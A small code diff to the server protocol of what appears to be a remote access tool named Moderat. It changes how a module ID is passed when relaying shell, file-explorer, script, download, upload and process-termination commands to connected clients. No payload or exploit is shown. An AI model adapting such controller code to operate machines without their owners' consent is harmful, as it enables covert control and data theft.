@@ -473,7 +473,7 @@ class ModeratServerProtocol(LineReceiver):
                                   'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode',
                                   'downloadMode', 'uploadMode',]:
                 try:
-                    self.send_message_to_client(clients[client_key]['socket'], payload, mode, session_id=session_id, module_id=data['module_id'],)
+                    self.send_message_to_client(clients[client_key]['socket'], payload, mode, session_id=session_id, module_id=module_id,)
                 except KeyError:
                     pass
             else:
